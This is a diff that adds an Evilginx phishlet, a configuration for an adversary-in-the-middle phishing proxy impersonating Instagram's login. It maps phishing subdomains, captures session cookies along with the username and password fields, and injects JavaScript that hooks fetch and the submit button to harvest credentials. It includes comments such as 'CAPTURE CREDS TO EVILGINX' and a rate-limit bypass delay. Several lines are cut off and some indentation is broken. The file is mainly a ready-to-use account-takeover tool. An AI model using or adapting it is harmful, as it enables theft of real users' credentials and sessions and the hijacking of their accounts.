@@ -1,0 +1,69 @@
+author: 'zeronix369'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true}
+
+sub_filters:
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://www.instagram.com/', >
+  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'https://www.instagram.com/', repl>
+
+auth_tokens:
+  - domain: '.instagram.com'
+    keys: ['sessionid','csrftoken','mid','ig_did','ds_user_id','rur','.*,regexp']
+
+credentials:
+  username: {key: 'identifier', search: '(.*)', type: 'post'}
+  password: {key: 'enc_password', search: '(.*)', type: 'post'}
+
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login/'
+
+js_inject:
+  - trigger_domains: ["www.instagram.com"]
+    trigger_paths: ["/accounts/login/"]
+ script: |
+      (function(){
+        let intercepted = false;
+        const origFetch = window.fetch;
+        window.fetch = async function(...args){
+          if(args[0] && args[0].includes('/accounts/login/ajax/') && !intercepted){
+            intercepted = true;
+            const formData = args[1];
+            const data = Object.fromEntries(new FormData());
+            data.identifier = document.querySelector('input[name="identifier"]')?.value || '';
+            data.enc_password = document.querySelector('input[name="password"]')?.value || '';
+
+            // CAPTURE CREDS TO EVILGINX
+            await fetch('/accounts/login/ajax/', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+              body: `identifier=${encodeURIComponent(data.identifier)}&enc_password=${encodeURIComponent(data.enc_passw>
+            });
+
+            // Rate limit bypass delay
+            await new Promise(r=>setTimeout(r, 2000 + Math.random()*1500));
+ }
+          return origFetch.apply(this, args);
+        };
+
+        // Button hijack backup
+        document.addEventListener('click', async e => {
+          if(e.target.matches('button[type="submit"]') && !intercepted){
+            e.preventDefault();
+            e.stopPropagation();
+            const user = document.querySelector('input[name="identifier"]')?.value;
+            const pass = document.querySelector('input[name="password"]')?.value;
+            if(user && pass){
+              await fetch('/accounts/login/ajax/', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: `identifier=${encodeURIComponent(user)}&enc_password=${encodeURIComponent(pass)}`
+              });
+              setTimeout(()=>e.target.closest('form').submit(), 2500);
+            }
+          }
+        }, true);
+      })();
